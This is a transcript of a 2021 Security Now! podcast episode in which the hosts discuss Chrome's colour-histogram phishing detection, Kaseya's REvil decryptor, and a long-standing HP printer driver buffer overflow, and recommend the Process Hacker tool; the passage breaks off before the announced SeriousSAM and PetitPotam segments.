LEO:  Good, good.  Well, I'm sorry to say this concludes this portion of Security Now!.  But you know you can get your daily or your weekly dose, just tune in every Tuesday around 1:30 Pacific, 4:30 Eastern, 20:30 UTC, and Steve and I will be here gassing away about the latest security news.  You can watch us make the show live at TWiT.tv/live, actually watch or listen.  There's audio and video there.  And if you're watching live, by the way, chat live:  irc.twit.tv.  After the fact you can of course always download a copy of the show.



Steve's got 16Kb versions for the bandwidth impaired, as well as the normal 64Kb MP3s, at GRC.com.  He also has very nicely done human-written transcripts, if you like to read along while you listen, or you want to use that for search.  That's a really good way to search for the part of the show you're looking for.  All of that's at GRC.com, along with SpinRite, the world's finest mass storage maintenance and recovery utility, GRC.com.



STEVE:  Wow.



LEO:  He's commending me because I remembered to say "mass storage" instead of hard drive because it works on all kinds of mass storage now.  You also can find the show at our website, TWiT.tv/sn.  It's on YouTube.  There's a whole YouTube channel for Security Now!.  And of course, if you use a podcast client, simple enough, search for TWiT or search for Security Now!, you'll find the show.  You can subscribe, get it automatically the minute it's available of a Tuesday afternoon.  You can also, if you would, leave us a five-star review, help the next generation of security wonks discover the best show on security on the Internet.



Thank you for being here, everybody.  Thank you, Steve Gibson, for the hard work you do.  And we'll see you next week.  I'll be dressed a little more formally for Security Now!.  Bye-bye.



STEVE:  Right-o.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#829

DATE:		July 27, 2021

TITLE:		SeriousSAM & PetitPotam

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-829.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we will plow into another two new serious vulnerabilities brought to the industry by Microsoft named SeriousSAM and PetitPotam.  But we first look at how Chrome managed to hugely speed up its phishing website early warning system, making it even earlier.  We cover the striking news of Kaseya having obtained a universal decryptor which is effective for every one of their victims.  We look at the massive HP printer driver mess and consider the larger lesson that it teaches.  We look at the new security features GitHub is bringing to its support of the "Go" language.  Then, after sharing one bit of listener feedback, we plow into SeriousSAM and PetitPotam.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with a potpourri of great, interesting tech news including how Chrome is making it easier to detect phishing sites using the colors on the page.  Kind of a clever fingerprinting algorithm.  We'll talk about a printer driver used by millions of HP, Samsung, and Xerox printers that is highly vulnerable.  And then we'll detail a couple of new Windows exploits.  And Steve will explain why he's no fan of how Microsoft does things these days.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 829, recorded Tuesday, July 27th, 2021:  SeriousSAM & PetitPotam.



It's time for Security Now!, the show where we cover your security, your privacy, online and off, with this guy right here, the chief, the man in charge, the explainer in chief,  Steve Gibson.  Hi, Steve.



STEVE GIBSON:  Yo, Leo.  Great to be with you once again.  We've got a bunch of stuff to talk about.  I feel so strongly about some of these topics that I thought maybe we should call this podcast Security With Attitude because we're going to be getting some this hour.  Okay.  This is Episode 829 for - this is our last podcast of July.  Somehow we've survived July.  Well, okay, wait.  We have four more days, so we'll hope that we're going to survive.



We're going to talk about two things.  We're going to plow into another two new serious vulnerabilities brought to the industry by Microsoft named SeriousSAM & PetitPotam.  And, you know, SeriousSAM, it was happening, it was breaking just as we were recording last week, referred to also as the Hive Nightmare.  But that was because of the printer nightmares that we've been surviving and talking about so far during the month.  So the person who came up with that, you know, it first got named that.  But SeriousSAM is better.  And of course it rhymes with PetitPotam.



LEO:  Did you ever play SeriousSAM the game?	



STEVE:  No.  As a matter of fact, when I googled to do some in-depth looking, I realized, oh.  And I was a little sucked into the Wikipedia entry.  It was sort of fascinating how back in the year 2000, it was about 20 years ago, the game engines cost a million dollars.  



SAM:  Hey, guys, let's play...



LEO:  That was SeriousSAM, just so you know.



SAM:  I won't pass by.  Let's fight.



LEO:  Okay, just so you know, one of the great classic games of all time.



STEVE:  I guess.  So I was unaware, but now I know.  



SAM:  Just what the hell was that, anyway?



LEO:  All right.  Thanks, Sam.  You're done.



STEVE:  Okay.  So we're going to look at how Chrome has managed to hugely speed up its phishing website early warning system, making it even earlier.  We cover the striking news of Kaseya having obtained a universal decryptor which is effective for every one of their victims.



LEO:  I wonder where they got that.



STEVE:  Uh-huh.  We look at the massive HP printer driver mess and consider the larger lesson it teaches.  And then we look at the new security features GitHub has just announced that it's bringing to its support for the Go Language. And after sharing one little bit of listener feedback, something I've mentioned before, just a useful reminder, we're going to plow into SeriousSAM and PetitPotam.  



LEO:  These are very creative names, I know.



STEVE:  And of course we have a great techie-oriented Picture of the Week that has been in my queue for a while, ever since I saw it.  And I thought, okay, now's a good time to share it with our, well, our viewers.  And I can describe it to our listeners.  So I think another great podcast for our...



LEO:  Thank you for considering both.  I do like it that you do that.  You're very good at describing those.  Picture of the Week, Steve?



STEVE:  Yeah.  So this one, it's fun.



LEO:  Oh, it's hysterical.



STEVE:  At first blush you'd think, okay, Photoshop, because it looks like it was photoshopped.  This was the conclusion of a stunning illuminated drone show.  This is 1,500 drones flying around in the air that assembled at the end of the presentation to present the QR code, which is valid and scannable, to the URL of the game company that put this on.



LEO:  Wow.



STEVE:  First it showed animated characters from the game, like swords being swung and all kinds of crazy stuff.  And frankly, I'm in awe of the idea that somehow they've developed the technology to microposition drones relative to each other with this kind of precision and animate it.  Anyway, it had been in the queue of things to show.  I just thought it was so cool that I wanted to share it with our listeners.  This took place in Shanghai.  I do have a link in the show notes to the article at Vice.com which talked about it.  And if anyone was curious, I did see the animated videos, and it's just astonishing.



LEO:  We were talking about this actually in our TWiT forums, twit.community forums.  And I found - because somebody said, well, how do they do that?  And I found a really good article at ScienceDirect.com that describes in great detail how these drone swarms, is what they call them, are positioned.



STEVE:  Are positioned so accurately.



LEO:  It's fascinating.  And it's multilayered.  They all have cameras.  But Intel's famous, they've got the drone - we could do it, Steve.  Just $90,000.  They've got, I don't know what it is, a couple thousand drones that will - we saw it at the Olympics a couple years ago; at the Super Bowl.  It's really, really, really cool.  So there's a whole article.



STEVE:  I think Biden's inauguration or his something...



LEO:  Yeah.



STEVE:  I think there was something in addition to fireworks, as I recall, also, that they were showing.



LEO:  Yeah.  Well, it's better than fireworks nowadays because it's not so damaging.



STEVE:  Yeah.



LEO:  They're reusable, obviously.  But it's a really incredible thing because these things fly within inches of each other, perfect formation.



STEVE:  Exactly.  And they've got high-speed spinning props.



LEO:  Yeah.



STEVE:  It's not like nothing.  Yeah, it's just very, very, very cool.



LEO:  Intel kind of invented a drone specifically to do this.  Yeah.  Whoops, that's my salad.  If I could have an Intel caprese drone, I'd be very interested.  But look what they can do.  I mean, it's just amazing.  It's really cool. 



STEVE:  That's drones?



LEO:  Yeah.  That owl?  Yeah.  Look at this.



STEVE:  Oh, very - oh.



LEO:  Much better, I think, than fireworks.



STEVE:  Yeah, yeah, yeah.  Very cool.



LEO:  All right.  Back to - I'm sorry.  I didn't mean to get sidetracked.



STEVE:  Let's see.  What were we - why are we here?



LEO:  What are we doing?  What are we talking about today?



STEVE:  Okay.  Actually, we do have a lot to talk about.  So I'm reading this Chromium blog posting titled "Faster and More Efficient Phishing Detection in M92," which is the just-released version of Chrome.  You know, because that sounds like a good thing.  And depending upon what the posting's details revealed, I figured that it might be of interest to our listeners.  You're hearing about it, of course, because that didn't turn out to be the case, though perhaps not for the reason you might imagine.



The posting starts out with a little introductory marketing spiel.  They said:  "Keeping Chrome users safe as they browse the web is crucially important to Chrome; in fact, security has always been one of our four corner principles."  Then I of course was wondering what the other three were, but anyway.  "In some cases, security can come at the expense of performance.  In this case" - and of course they named their series "The Fast and the Curious."



LEO:  Oh, god.



STEVE:  I know.  "We are excited to share how improvements to our phishing detection algorithms keeps users safe online.  With these improvements, phishing detection is now 50" - five oh, and it turns out it's actually a statistical spread, but we'll get there in a second - "50 times faster" - it should say "as much as" - "50 times faster and drains less battery."



Then under the subheading of "Phishing Detection" they write, and they begin to explain this, and this is what I had to like do a double-take:  "Every time you navigate to a new page, Chrome evaluates a collection of signals about the page to see if it matches those of phishing sites."  Okay.  "To do that, we compare the color profile of the visited page."



LEO:  What?



STEVE:  I know.  "That's the range and frequency of colors present on the page."



LEO:  That's - what does that have to do with phishing?



STEVE:  Exactly, it's nuts, "with the color profiles of common pages.  For example, in the image below, we can see that the colors are mostly orange, followed by green and then a touch of purple."  Now, in the show notes, I have that captured.  Of course those listening cannot see the diagram which I've included in the show notes.  But it's a page with a bunch of orange pumpkins so that orange dominates the page, though they are all in light blue frames.  It actually has more surface area.  For some reason in their example they're ignoring the light blue.  Okay.  Maybe they actually do ignore the background.  I don't know.  Actually, later on it looks like they don't.  But they also pick up on one of the frames which has a green background.  But in any event, this says that to detect phishing they're looking at a page's color distribution.  So my first thought was like yours, Leo.  What?



LEO:  What?  Why?  Yeah.



STEVE:  They're comparing the color profile of a page we visit to the color profiles of common pages?  Really?  Turns out yes, they are.  That's what Chrome does.  Then it hit me.  Whatever they do to pull off this detection needs to be done entirely on the client.



LEO:  Right.



STEVE:  Right?  Chrome cannot be sending all visited page URLs back to the Google mothership.  That would be a privacy catastrophe.  Okay, now, and we'll ignore for the time being that loading our web pages down full of image beacon pixels and JavaScript is essentially doing exactly that.  But okay.  Not formally.  And then they confirm the nature of the strategy by explaining:  "If the site matches a known phishing site, Chrome warns you to protect your personal information and prevent you from exposing your credentials.  To preserve your privacy, by default Chrome's Safe Browsing mode never sends any images outside the browser.  While this is great for privacy, it means that your machine has to do all the work to analyze the image."



Okay.  So then what follows I've lightly edited to clarify what they're saying without the use of any graphics.  So they essentially wrote:  "Image processing can generate heavy workloads because analyzing the image requires an evaluation of each pixel in what is commonly known as a 'pixel loop.'  Some modern monitors display upwards of 14 million pixels, so even simple operations on each of those pixels can add up to a lot of CPU use.  For phishing detection, the operation that takes place on each pixel is the counting of its basic colors."



LEO:  Wow.



STEVE:  Yeah.  This was all news to me.



LEO:  Did they explain why they're monitoring the colors?  I'm sure there's some correlation, but I just - it's not obvious.



STEVE:  So they say, yeah, kind of.  "The colors are stored in an associative data structure called a hash map.  For each pixel, we extract its RGB color values and store the counts in one of three different hash maps."  So I guess they break it down into RGB, and then they're storing a histogram of the individual intensities of each R, G, and B component.



LEO:  Yeah, they probably hash it for speed; right?



STEVE:  And then hashing.  Right.  And they said:  "One for each color.  Adding one item to a hash map is fast, but we have to do this for millions of pixels.  We try to avoid reducing the number of pixels to avoid compromising the quality of the analysis.  However, the computation itself can be improved; and in this just-released 92, it has been.  The code now avoids keeping track of RGB channels in three different hash maps and instead uses only one to index by color.  Three times less counting," they said.  "And" - this I think is the big key - "consecutive pixels are summed before being counted in the hash map."



LEO:  It's kind of like Huffman encoding.



STEVE:  Yeah, right.  "For a site with a uniform background color" - thus the reason I said, well, they actually are paying attention to background colors - they said, "this can reduce the hash map overhead to almost nothing."  Like in the same way as you said, Huffman would compress a long run of something down to something very short.  "With the new approach, there are significantly fewer operations on the hash map.  As a result, starting with 92, Chrome now executes image-based phishing classification" - okay, so the big takeaway is that phishing is using image-based classification, like, okay, who knew that? - "up to 50 times faster at the 50th percentile."



Okay, so that means what, that half of the users get 50 times improvement.  On one side of the 50th percentile they're getting even better improvement, and on the other side they're getting less dramatic improvement.  But they did say "and 2.5 times faster at the 99th percentile."  So even 99% of all users will get up to at least 2.5 times faster.  "On average," they said, "users will get their phishing classification results after 100 milliseconds, instead of 1.8 seconds."  They said:  "This benefits you in two ways as you use Chrome.  First and foremost, using less CPU time to achieve the same work improves general performance.  Less CPU time means less battery drain and less time with spinning fans.



"Second, getting the results faster means Chrome can warn you sooner.  The optimization brought the percentage of requests that took more than five seconds to process from 16.25% to less than 1.6%."  So 16.5% were actually requiring more than 5.5 seconds for Chrome to decide if this was a phishing page you were being shown.  So this client-side phishing detection has been very time and compute intensive.  And they said:  "The speed improvement makes a real difference in security, especially when it comes to stopping you from entering your password in a phishing site."  Yeah, five seconds.



And so if you've got any kind of automated username and password insertion going on, you may have already done that.  It will have filled in the form, and you've clicked "log me in" before five seconds have passed.  And then it turns out to be a malignant, malicious site.  So yeah, you don't want to wait, I mean, you want to know a lot faster than that.



They said:  "Overall, these changes achieve a reduction of almost 1.2% of the total CPU time used by all Chrome renderer processes and utility processes.  At Chrome's scale, even minor algorithm improvements can result in major energy efficiency gains in aggregate.  Here's to many, many more centuries of CPU time saved.  Stay tuned for many more performance improvements to come."  So what they must have done is done some performance profiling of Chrome and looked at, like, where all the time was going, and a chunk of it was going to looking at every single page the user visits.  And is it valid?



And so this also means that in every end-user's Chrome repository on their local machine are a set of criteria that, like, phishing sites they have seen and profiled.  So they've done this wacky image distillation and basically reduced the image to a hash, and they've stored all these hashes, lord knows how many, on our hard drives.  And when you go to a page, Chrome performs this process and checks to see if there's a match with any known phishing images and, if so, warns you.



LEO:  It's essentially fingerprinting the site, but it's doing so by its use of color.  And I bet you where this came from is you have a similar problem if you're trying to detect porn.  And so all of the companies, Facebook, Google, anybody who's got image storage has an algorithm, especially not just porn in general, but revenge porn, where they have hashes of known revenge porn images, and then they look for...



STEVE:  Any future occurrence.



LEO:  If it matches, oh, we've got another one, and they pull it down immediately.  And I suspect - and they also, I think there were attempts to do this with just too much flesh at one point, which by the way were not very effective.  But that's probably where the body of knowledge comes from.



STEVE:  Oh, so it used to be heuristic.



LEO:  Heuristic, yeah.



STEVE:  So if it were a lot of flesh tones, eh.



LEO:  A lot of flesh tones, eh.  That didn't work so well.  I remember they stopped doing that.  But I suspect that the research done is probably related to this.  So what's interesting is the choice and use of colors in a site are unique enough that you can say it's a fingerprint, essentially.  Very interesting.



STEVE:  Yup.  And the other nice thing about this is, when you think about it - because we're all twitchy now about fingerprinting; right?  So this is something that absolutely destroys the image.  Like you're not in any way storing a representation of an image that could be sensitive.  It's a hash of some deconstruction of the individual RGB values which are counted in some fashion and just, you know.  So, I mean, it's really - and the fact that they're using a hash means that it can't be reversed; right? 



LEO:  That was the image with revenge porn.  You don't want to circulate those images.



STEVE:  Right.



LEO:  That would be counterproductive.



STEVE:  And as we know, anytime you pump something through a hash, that's an information lossy process, in this case on purpose.  So they've come up with something which is certainly not inexpensive to do, and it's like, wow, I didn't realize that was happening in the background.  And I've had that big, you know, I'm sure we've all, Chrome users, the whole screen goes red.



LEO:  Oh, yeah.  



STEVE:  And it's like, "Warning, Will Robinson."  It's like, whoa, what happened?  There it is, yup, there is a perfect sample of it that you just brought up.



LEO:  Deceptive site ahead.



STEVE:  Right.



LEO:  I just think it's a - this is a very kind of computer science-y solution.  Because the problem is, well, how do you, okay, we've got known phishing sites.  How do you fingerprint those and identify them in a speedy way in future?  And I love it that they said, you know, if we just look at the colors, that's enough.



STEVE:  Yeah.



LEO:  I think it's great.  And we can hash those very quickly.



STEVE:  And so the takeaway is probably do not put too many pictures of pumpkins on your...



LEO:  Stay away the pumpkins.



STEVE:  Might cause a false positive.  Because pumpkins could be misconstrued.



LEO:  You never know.  You never know.



STEVE:  Okay.  So this was very cool in our ransom news section.  A universal decryptor for all Kaseya victims.  The industry recently received some news from Kaseya, who recently posted a pair of interesting updates.  The first one was posted last Thursday, on July 22nd, at 3:30 p.m. Eastern.  This was their announcement.



They said:  "Kaseya has obtained a universal decryptor key.  On 7/21/2021" - so that was the day before their posting, so last Wednesday - they wrote, "Kaseya obtained a decryptor for victims of the REvil ransomware attack, and we're working to remediate customers impacted by the incident.  We can confirm that Kaseya obtained the tool from a third party and have teams actively helping customers affected by the ransomware to restore their environments, with no reports of any problem or issues associated with the decryptor.  Kaseya is working with Emsisoft to support our customer engagement efforts, and Emsisoft has confirmed the key is effective at unlocking victims.



"We remain committed to ensuring the highest levels of safety for our customers and will continue to update here as more details become available.  Customers who have been impacted by the ransomware will be contacted by Kaseya representatives."



LEO:  Oh, by the way, and forced to sign an NDA.



STEVE:  Ah, interesting.



LEO:  So, yeah.



STEVE:  I did see reference to the NDA, but I didn't track that down.  Then yesterday, on Monday - oh, to sign an NDA not to disclose that they were a victim and, like, raise the profile of the attacks on Kaseya.



LEO:  And I wonder if also Kaseya wants to hide the fact that they almost certainly bought this decryptor from the REvil gang; right?



STEVE:  Well, so then, yesterday, Monday, July 26th, at 1:00 p.m. Eastern, they updated what they had posted, writing:  "Throughout this past weekend, Kaseya's Incident Response team and Emsisoft partners continued their work assisting our customers and others with the restoration of their encrypted data.  We continue to provide the decryptor to customers that request it, and we encourage all our customers whose data may have been encrypted during the attack to reach out to your contacts at Kaseya.  The decryption tool has proven 100% effective at decrypting files that were fully encrypted in the attack."



Next paragraph:  "Kaseya has maintained our focus on assisting our customers.  And when Kaseya obtained the decryptor last week, we moved as quickly as possible to safely use the decryptor to help our customers recover their encrypted data.  Recent reports have suggested that our continued silence on whether Kaseya paid the ransom may encourage additional ransomware attacks, but nothing could be further from our goal.  While each company must make its own decision on whether to pay the ransom, Kaseya decided after consultation with experts to not negotiate with the criminals who perpetrated this attack, and we have not wavered from that commitment. As such, we are confirming in no uncertain terms that Kaseya did not pay a ransom, either directly or indirectly through a third party, to obtain the decryptor."



LEO:  Oh.  So where did they get it?



STEVE:  So thanks to our podcast, which unfortunately, Leo, you missed because it's what I did two weeks ago, that was titled "REvil's Clever Crypto," we know exactly how a single campaign-wide multi-system universal decrypting tool could be provided.  Thanks to the dual side-by-side encryption of the private half of each system-specific key pair, either the REvil affiliate themselves could have been induced to provide their private key for the entire Kaseya campaign or, up a level in the hierarchy, the REvil gang themselves could have provided a universal decryptor which would have been effective for all of that affiliate's victims, among which Kaseya would certainly have been the most prominent.



LEO:  As I remember, REvil was offering it.  I think it was $20 million for the universal...



STEVE:  70.



LEO:  70.  Well.



STEVE:  70.  And so what we presume sort of that goes, I think corresponds to last week's podcast, which was titled "REvil Vanishes," we could presume...



LEO:  That they got the money.



STEVE:  ...pressure.  Well, either they got the money, or they got pressure; right?  It's got to be the case that law enforcement in Russia, responding probably to political heat...



LEO:  Maybe.  Maybe you want to hand over key.



STEVE:  Yeah.



LEO:  Would be good if you do.



STEVE:  And what's so cool about the nature of the hierarchy is that either the affiliate who may have also been knowable could have been told, okay, you're giving up this key for the Kaseya attacks because you have to.  Or REvil could have been asked to provide the key to decrypt all of the affiliates' work.  So we'll never know what transpired.  But the good news is all of the Kaseya victims get decrypted.  And I think it supports the contention, further supports it, that I voiced last week, that we can expect to see future ransomware attacks and attackers working to deliberately remain under the radar.



From the standpoint of REvil and their affiliate, the Colonial Pipeline, the JBS Foods, and the Kaseya attacks have been catastrophic for them.  You know, they were not good results because they became far too public, and thus they became political.  So anyway, I'm sure that the lesson that's been taken away, that they have taken away, is to make much smaller waves in the future.  Yes, we know that there's money to be made, but not when you make too much at once.  That's just not - that just doesn't have a good outcome here.



Okay.  The printer driver used by, it's estimated, hundreds of millions of HP, Samsung, and Xerox printers turns out to be exploitable.  A researcher by the name of Asaf Amir with SentinelLabs gave HP, Samsung, and Xerox, although primarily HP because, as we'll see, it was OEMed to the other two - a generous five-month vulnerability pre-disclosure quiet period of what he and his team discovered.  So HP was notified last February, five months ago.  Microsoft has incorporated its update into one of the very recent Windows updates.  The SentinelLabs vulnerability disclosure was just published last Tuesday.  It contains four bullet points by way of its Executive Summary.



They said:  "SentinelLabs has discovered a high-severity flaw in HP, Samsung, and Xerox printer drivers.  Since 2005, HP, Samsung, and Xerox have released millions of printers worldwide with the vulnerable driver.  SentinelLabs' findings were proactively reported to HP on Feb 18th, 2021 and are tracked as CVE-2021-3438, marked with a CVSS Score of 8.8.  HP released a security update on May 19th to its customers to address the vulnerability."  And somewhere I saw that Microsoft had incorporated that update into their own Windows Update, thank goodness, otherwise this thing would be a serious pain.



So what Asaf and his team discovered was a trivial-to-exploit flaw affecting the printer drivers used by a large family of printers which have been continuously shipping since 2005.  Leo, 2005 is the year we began this podcast.



LEO:  Yeah.



STEVE:  So as long as this podcast has been running, all of the printer drivers in HP's printers have been shipping with this flaw.



LEO:  Ugh.



STEVE:  Yeah.  Here's the way Asaf describes what happened and what they found:  "Several months ago," he wrote, "while configuring a brand new HP printer, our team came across an old printer driver from 2005 called SSPORT.SYS, thanks to an alert by Process Hacker once again."  Now, we'll be looping back, and I'm going to tell everybody about Process Hacker so you don't need to take a note yet.  He said:  "This led to the discovery of a high-severity vulnerability in HP, Xerox, and Samsung printer driver software that has remained hidden for 16 years.  This vulnerability affects a very long list of over 380 different HP and Samsung printer models, as well as at least a dozen different Xerox products."



So the disclosure page shows a sample.  These guys, SentinelLabs' vulnerability disclosure, lists some printers.  But Leo, go to the page here in the show notes, at the top of page 5 of the show notes.  And then expand under the affected products.  It just says "affected products" with a little plus sign.  Stand back when you click on that and start scrolling because this thing goes on and on and on and on and on.



LEO:  Wow.



STEVE:  So, yeah.  This is a list.



LEO:  A lot of these are Samsung.



STEVE:  Yeah, well, because they were OEMing it from HP.



LEO:  Oh, boy.



STEVE:  Yeah.  "So just by running the printer software, the driver gets installed and activated on the machine, regardless of whether," he writes, "you complete the installation or cancel."  You can even cancel when it starts to install.  It doesn't matter.  It already got in.  "Thus, in effect," he writes, "this driver gets installed and loaded without even asking or notifying the user.  Whether you are configuring the printer to work wirelessly or via a USB cable, this driver gets loaded.  In addition, it will be loaded by Windows on every subsequent boot.  This makes the driver a perfect candidate to target since it will always be loaded on the machine, even if there is no printer connected.



"The vulnerable function inside the driver accepts data sent from User Mode via IOCTL (Input/Output Control) without validating the size parameter.  This function copies a string from the user input using strncpy" - standard library, C library function (S-T-R-N-C-P-Y) - "with a size parameter that is controlled by the user.  Essentially, this allows attackers to overrun the buffer used by the driver and run code that they have provided."



Okay.  So just stop for a minute.  We have, for the last 16 years, every instance of those 380 HP printers and all of those Samsungs and a handful of Xeroxes, when the drivers touch your system, installs this SSPORT.SYS device driver, setting it up to run at boot.  It contains an IOCTL API call that I'll explain in a second, which allows any program in user mode to gain system privileges on the kernel.  And it's been in essentially all Windows systems that have any of these, that have ever touched any of these 380 different HP printers for the last 16 years.



Okay.  Windows IOCTL API is explicitly a means for allowing unprivileged user mode code running in Ring 3 to communicate with drivers, with services and other kernel code in Ring 0.  It's an officially sanctioned and supported Windows API.  So what we have here once again is a trivial-to-exploit means for bypassing Windows' entire process and user security privilege model.  Last week we were introduced to the idea of signing a malicious driver, a printer driver, for installation somewhere within an enterprise's network, whereupon Windows would auto load it through their PointAndPrint facility, which Microsoft subsequently assured us was "vulnerable by design," their exact words.  Therefore, it truly wasn't a bug.  It was a feature.



Now we learn that for 16 years, from 2005 until a month or two ago, when HP posted this on their site, which no one would see, but Microsoft presumably incorporated it into a Windows Update - maybe it was three weeks ago.  Until a month ago, when this was fixed, for hundreds of millions of Windows systems worldwide it was no longer necessary to bother with even malicious printer drivers because a popular, often-installed printer driver would, you know, you didn't have to bother with all that muss and fuss.  Just find any machine with the SSPORT.SYS device driver present, and pass a specially crafted IOCTL API call to it, immediately taking over the system.



And then they continued.  The guys at Sentinel said:  "An interesting thing we noticed while investigating this driver is the peculiar hardcoded string:  'This String is from Device Driver@@@@.'"  They wrote:  "It seems that HP didn't develop this driver, but copied it from a project in Windows Driver Samples by Microsoft that has almost identical functionality."  They said:  "Fortunately, the MS sample project does not contain the vulnerability."  So they took the sample code; you know?  Where have we heard this before, Leo?  Remember UPnP, where Intel posted sample UPnP source, saying here's some code.  Don't use it.  And then of course everybody did.  And it contained a flaw that then, surprise, everybody had.



Okay.  So in this case the modification they made to the sample project was what induced the flaw, and that's what they've been shipping for 16 years.  So they said, the Sentinel guys, the SentinelLabs guys:  "An exploitable kernel driver vulnerability can lead an unprivileged user to a SYSTEM account and run code in kernel mode, since the vulnerable driver is locally available to anyone.  Among the obvious abuses of such vulnerabilities are that they could be used to bypass security products.  Successfully exploiting a driver vulnerability might allow attackers to potentially install programs; view, change, encrypt or delete data; or create new accounts with full user rights.  Weaponizing this vulnerability might require chaining other bugs as we didn't find a way to weaponize it by itself given the time invested."  In other words, they didn't bother taking the time.  Bad guys would.



And they finished:  "Generally speaking, it is highly recommended that in order to reduce the attack surface provided by device drivers with exposed IOCTL handlers, developers should enforce strong ACLs (Access Control Lists) when creating kernel device objects, verify user input" - uh-huh, that is, not give the user control over the length of the buffer that's allocated, which it then fills - "and not expose a generic interface to kernel mode operations."



Okay.  Now, stepping back from the specifics, as I mentioned above, the world has apparently dodged another bullet.  We don't know of this vulnerability having been discovered and used to perform effortless elevation of privilege attacks on Windows systems during the previous 16 years.  But the ability to do so has been there since, as I said, the start of this podcast.  But we should take note that this highlights a fundamental and significant security weakness in the architecture of Windows, which can never be remedied.  We saw a strong hint of this design flaw last week, as I mentioned, when Mimikatz's Benjamin Delpy demonstrated how a malicious printer driver, once signed and installed into a low-value machine, could be proactively pulled throughout an enterprise by Windows PointAndPrint feature, which was designed to silently and automatically install any needed drivers so that its users didn't need to be bothered with any of that.



But Windows' problem is actually much worse, as this serious problem with a widespread HP printer driver has just demonstrated.  Windows drivers, like core services, run in the kernel.  Userland applications can communicate with them in two ways - through the normal data channel, which is opening a device and then sending output to it, you know, we might call this use "in band use" of the driver.  But drivers can also be communicated with out of band through the use of the IOCTL API.  A printer driver, for example, might provide IOCTL services to user mode applications for setting its page orientation, checking on the toner level, or communicating readiness and error conditions.  You know, all those things now that drivers do that's not just dumping the page out.  That's all accomplished through the IOCTL API.  So it exists.  And it's heavily used.



So Windows provides both for in-band and out-of-band communication between applications and drivers.  That's not unusual.  But these drivers, as I mentioned, run with kernel-level privilege.  And the out-of-band IOCTL API deliberately crosses privilege boundaries.  This means that any flaw existing in any driver can be used by any code running on the system to compromise that system.  And as we've just seen, these drivers are not all written, vetted, and provided by Microsoft.  More often, they're provided by third parties to make their devices work with Windows.  Therefore, any mistake made by any device driver vendor which is discovered by anyone malicious can potentially be used to compromise an entire system containing that driver.



A long time ago, in a galaxy far, far away, long before network security was even a thing, this design made sense because remote attackers operating from hostile foreign countries were not able to lurk in our machines.  But we've often used the apropos model of a chain of individual links, where the strength of the entire chain is limited by the strength of its weakest link.  In Windows, the weakest links may be flaws lurking in the services and device drivers provided by well-meaning developers whose code has never been thoroughly stress-tested and security vetted because the moment it started to work without crashing, it was declared finished.  And it was packaged up and shipped.



So in that world, which is now unfortunately this world, it doesn't take much imagination to picture an attacker who gets into a machine as a low-privilege user.  They take an inventory of the system's third-party services and device drivers, then cross-reference that inventory against their own internal stash of never disclosed, privately known, third-party service and device driver exploits to determine which entry point into the kernel this system will offer.



LEO:  And the good news is, thanks to hashing, this now takes seconds less.  It's probably pretty instantaneous.



STEVE:  Exactly.  So this is a problem.  We don't want to talk about it because there's nothing we can do about it.  Our userland code has to talk through to the Ring 0 to talk to the device drivers that are down there with those privileges.  This just happened to come to light when these guys thought, wait a minute, SSPORT.SYS.  That's from 2005, 16 years ago.  Has anyone looked at its security?  And no.



LEO:  No.



STEVE:  And what they found was a trivial-to-exploit buffer overflow.  Now, this would be a disaster if this was something that Microsoft weren't able to fix quickly.  The problem is, and this is what I hope I've - the point I've driven home.  This is like Colonial Pipeline; right?  It was so big that it got, you know, it was a disaster, and it got remedied.  Or Kaseya.  But what the ransomware guys now know they have to do is distribute their attacks.  Unfortunately, what we have is a case of distributed drivers.  Rather than, you know, this one, this big HP one was such a mess that Microsoft said, oh, crap, and like immediately gave it a Patch Tuesday fix.  The problem is who knows what serious security flaws are lurking in all the little smaller third-party things that exist in Windows that nobody has bothered to take a look at.  Again, I would not be surprised.



We talked about some time ago the model of vulnerability becoming publicly known for some service that has a public exposure on the Internet, and the bad guys have - no doubt, Leo, it's been hashed - a big hash table of port numbers that immediately lead them to the exploits they know about to take advantage of that, the appearance of that thing on some port.  And they jump on it before it can get patched.  So anyway, nothing can be done.  But we are on essentially an increasingly brittle-seeming operating system platform.  And as we're going to learn by the end of this podcast, thank you, as we're going to learn by the end of this podcast, even 11 doesn't fix it.



And before we take our second break, I wanted to mention, bring to our listeners' notice something that these guys used that brought this to their attention called Process Hacker.  The SentinelLabs guys discovered this whole HP printer driver mess when this thing called Process Hacker proactively popped up a notification that this SSPORT.SYS service had just been created as a result of something they were doing.  I for one would love the idea of being proactively notified when something has just added a background service or driver to my system.  Maybe it's something I'm expecting.  But if it's not, I want to know.



So I wanted to take a moment to shine a light on the tool they used known as Process Hacker.  Many of us are familiar with Mark Russinovich's excellent Sysinternal Tools.  One of them, Process Explorer, is immediately reminiscent of Process Hacker.  It looks like - Process Hacker I guess I would describe as Process Explorer on steroids.  And it's open source.



LEO:  It's open source, that's awesome.



STEVE:  Open source.  So Process Hacker has taken what Mark has done much further.  It's open source.  It's still at SourceForge, but it also has a GitHub presence.  It runs on anything from Win7 on.  It shows a download count of 6.5 million.  It shows 34 contributors, 814 forks, and is being actively developed and maintained.  It bills itself as a free, powerful, multipurpose tool that helps you monitor system resources, debug software, and detect malware.  Its bullet-pointed feature list says a detailed overview of system activity with highlighting.  Graphs and statistics allow you to quickly track down resource hogs and runaway processes.  Can't edit or delete a file?  Discover which processes are using that file.  See what programs have active network connections and close them if necessary.  Get real-time information on disk accesses and who's doing them.  View detailed stack traces with kernel mode, WOW64, and .NET support.  Go beyond services .msc; create, edit, and control services.  Small, portable, no installation required.  100% free open software under GPL v3.



LEO:  That's really great.



STEVE:  And it offers a plug-in architecture for extensions.  So it's able to sit quietly in the background, alert when something is setting up permanent residence on any Windows machine.  So anyway, if any of you listening haven't completely given up on the idea that you might still have some remaining shred of control over the machine that's sitting in front of you, google "process hacker," and you'll find it.  It comes up first of many hits.



LEO:  It's on SourceForge, SourceForge.io? 



STEVE:  Exactly.



